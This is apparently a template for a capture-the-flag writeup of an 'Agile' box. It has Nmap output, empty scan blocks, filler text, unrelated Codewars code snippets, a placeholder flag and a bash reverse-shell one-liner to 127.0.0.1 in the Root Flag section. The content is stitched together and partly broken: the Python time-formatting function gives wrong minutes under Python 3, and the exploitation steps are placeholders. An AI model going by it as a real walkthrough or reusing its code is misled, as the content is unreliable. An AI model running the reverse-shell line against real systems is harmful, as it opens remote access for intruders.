# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
$ nmap -A 10.10.11.203 -T4        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 09:43 EDT
Nmap scan report for superpass.htb (10.10.11.203)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)

80/tcp open  http    nginx 1.18.0 (Ubuntu)

|_http-title: SuperPassword \xF0\x9F\xA6\xB8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.42 seconds
```
From the above output we can see that ports, **22** and **80** are the ports open.

## Nikto

```console
$ nikto -host 10.10.11.203                                                                                   1 тип

```
Nothing interesting except that the server uses an outdated version of nginx.

## Gobuster
### Subdirectories:
Since we have a website then we scan the target for subdirectories.

```console
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u superpass.htb -t 80

```
We found 3 subdirectories for the moment, none of whoch seems interesting as they all redirect to a login page or lead to an error, we can re-check those which require a login later if we succeed to do so.

Let's surf the website.

![My Website](../images/agile1.png)

\ **Figure 1:** My Website

After some clicking and navigation I found a page that allows to register a new user, store some passwords and then export those to a downloadable pdf file.

The first normal reaction that would come to anyones mind is to intercept the download request and mess a little bit with its content in order to achieve an LFI attack. But Let's not rush that and do more reconnaissance. We'll run gobuster again to see if there are any hidden pages we can access.

Maybe we want to show some python code too, to let's take a look at a snipped from [codewars](https://www.codewars.com) to format time as human readable.

```python
def make_readable(seconds):        

    hours = seconds / 60**2
    minutes = seconds/60 - hours*60
    seconds = seconds - hours*(60**2) - minutes*60

    return '%02d:%02d:%02d' % (hours, minutes, seconds)
```


# Exploitation  

In order to gain our initial foothold we need to blablablabla. Here's another code snippet just for fun.

```php
function sqInRect($lng, $wdth) {

    if($lng == $wdth) {
      return null;
    }

    $squares = array();

    while($lng*$wdth >= 1) {
      if($lng>$wdth) {
        $base = $wdth;
        $lng = $lng - $base;
      }
      else {
        $base = $lng;
        $wdth = $wdth - $base;
      }
      array_push($squares, $base);
    }
    return $squares;
}
```
Above is the php code for the **Rectangle into Squares** kata solution from codewars.


## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.

# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
